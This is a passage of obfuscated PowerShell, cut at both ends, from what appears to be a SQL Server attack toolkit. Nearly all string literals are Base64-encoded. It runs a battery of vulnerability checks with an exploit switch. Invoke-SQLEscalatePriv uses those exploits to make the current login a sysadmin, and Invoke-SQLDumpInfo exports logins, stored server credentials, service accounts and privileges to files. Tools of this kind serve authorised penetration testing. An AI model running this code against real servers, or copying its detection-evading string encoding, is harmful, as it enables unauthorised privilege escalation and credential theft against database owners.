        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBTAGUAcgB2AGUAcgBMAGkAbgBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBUAHIAdQBzAHQAdwBvAHIAdABoAHkA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBEAGIAQwBoAGEAaQBuAGkAbgBnAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBDAHIAZQBhAHQAZQBQAHIAbwBjAGUAZAB1AHIAZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBYAHAARABpAHIAdAByAGUAZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBYAHAARgBpAGwAZQBlAHgAaQBzAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIARABkAGwAQQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIATwB3AG4AZQByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBhAG0AcABsAGUARABhAHQAYQBCAHkAQwBvAGwAdQBtAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBRAEwAaQBTAHAARQB4AGUAYwB1AHQAZQBBAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBRAEwAaQBTAHAAUwBpAGcAbgBlAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBBAHUAdABvAEUAeABlAGMAUwBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA==')))) 
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBVAE4ATgBJAE4ARwAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
    }
    Process
    {
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message "$Instance : RUNNING VULNERABILITY CHECKS..."
        $TblVulnFunc |
        % -Process {
            $FunctionName = $_.FunctionName
            if($Exploit)
            {
                $TblTemp = iex -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password' -Exploit"
            }
            else
            {
                $TblTemp = iex -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password'"
            }
            $TblData = $TblData + $TblTemp
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK."
    }
    End
    {
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAE0AUABMAEUAVABFAEQAIABBAEwATAAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
            $CheckAccess = (iex -Command $OutFolderCmd) 2>&1
            if($CheckAccess -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBkAGUAbgBpAGUAZAAuAA=='))))
            {
                Write-Verbose -Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABkAGUAbgBpAGUAZAAgAHQAbwAgAG8AdQB0AHAAdQB0ACAAZABpAHIAZQBjAHQAbwByAHkALgA=')))
                Return
            }
            else
            {
                Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAaQBmAGkAZQBkACAAdwByAGkAdABlACAAYQBjAGMAZQBzAHMAIAB0AG8AIABvAHUAdABwAHUAdAAgAGQAaQByAGUAYwB0AG8AcgB5AC4A')))
                $RemoveCmd = "del $OutFolder\test.txt"
                iex -Command $RemoveCmd
                $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
                $OutPutPath = "$OutFolder\"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFUAcABTAFEATABfAEEAdQBkAGkAdABfAFIAZQBzAHUAbAB0AHMAXwA=')))+$OutPutInstance+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAHMAdgA=')))
                $OutPutInstance
                $OutPutPath
                $TblData  | epcsv -NoTypeInformation $OutPutPath
            }
        }
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLEscalatePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )
    Begin
    {
    }
    Process
    {
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message "$Instance : Checking if you're already a sysadmin..."
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            Write-Verbose -Message "$Instance : You are, so nothing to do here. :)"
        }
        else
        {
            Write-Verbose -Message "$Instance : You're not a sysadmin, attempting to change that..."
            Invoke-SQLAudit -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoOutput -Exploit
            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if($IsSysadmin2 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
            {
                Write-Verbose -Message "$Instance : Success! You are now a sysadmin!"
            }
            else
            {
                Write-Verbose -Message "$Instance : Fail. We couldn't get you sysadmin access today."
            }
        }
    }
    End
    {
    }
}
Function Invoke-SQLDumpInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write output to.')]
        [string]$OutFolder,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to xml files.')]
        [switch]$xml,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to csv files.')]
        [switch]$csv
    )
    Begin
    {
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }
        else
        {
            $OutFolder = '.'
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }
        $CheckAccess = (iex -Command $OutFolderCmd) 2>&1
        if($CheckAccess -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBkAGUAbgBpAGUAZAAuAA=='))))
        {
            Write-Host -Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABkAGUAbgBpAGUAZAAgAHQAbwAgAG8AdQB0AHAAdQB0ACAAZABpAHIAZQBjAHQAbwByAHkALgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAaQBmAGkAZQBkACAAdwByAGkAdABlACAAYQBjAGMAZQBzAHMAIAB0AG8AIABvAHUAdABwAHUAdAAgAGQAaQByAGUAYwB0AG8AcgB5AC4A')))
            $RemoveCmd = "del $OutFolder\test.txt"
            iex -Command $RemoveCmd
        }
    }
    Process
    {
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message "$Instance - START..."
        $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
        Write-Verbose -Message "$Instance - Getting non-default databases..."
        $Results = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database users for databases..."
        $Results = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBVAHMAZQByAHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBVAHMAZQByAHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting privileges for databases..."
        $Results = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBwAHIAaQB2AGkAbABlAGcAZQBzAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBwAHIAaQB2AGkAbABlAGcAZQBzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database roles..."
        $Results = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database role members..."
        $Results = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAF8AbQBlAG0AYgBlAHIAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAF8AbQBlAG0AYgBlAHIAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database schemas..."
        $Results = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAGMAaABlAG0AYQBzAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAGMAaABlAG0AYQBzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database tables..."
        $Results = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB0AGEAYgBsAGUAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB0AGEAYgBsAGUAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database views..."
        $Results = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB2AGkAZQB3AHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB2AGkAZQB3AHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting database columns..."
        $Results = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBjAG8AbAB1AG0AbgBzAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBjAG8AbAB1AG0AbgBzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server logins..."
        $Results = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAbwBnAGkAbgBzAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAbwBnAGkAbgBzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server configuration settings..."
        $Results = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server privileges..."
        $Results = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAcgBpAHYAaQBsAGUAZwBlAHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAcgBpAHYAaQBsAGUAZwBlAHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server roles..."
        $Results = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server role members..."
        $Results = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAbQBlAG0AYgBlAHIAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAbQBlAG0AYgBlAHIAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server links..."
        $Results = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server credentials..."
        $Results = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting SQL Server service accounts..."
        $Results = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGkAYwBlAF8AYQBjAGMAbwB1AG4AdABzAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGkAYwBlAF8AYQBjAGMAbwB1AG4AdABzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting stored procedures..."
        $Results = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting custom extended stored procedures..."
        $Results = Get-SQLStoredProcedureXP -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AeABwAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AeABwAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server policies..."
        $Results = Get-SQLServerPolicy -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAbwBsAGkAYwB5AC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAbwBsAGkAYwB5AC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting stored procedures with potential SQL Injection..."
        $Results = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwBxAGwAaQAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwBxAGwAaQAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting startup stored procedures..."
        $Results = Get-SQLStoredProcedureAutoExec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwB0AGEAcgB0AHUAcAAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwB0AGEAcgB0AHUAcAAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting CLR stored procedures..."
        $Results = Get-SQLStoredProcedureCLR -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
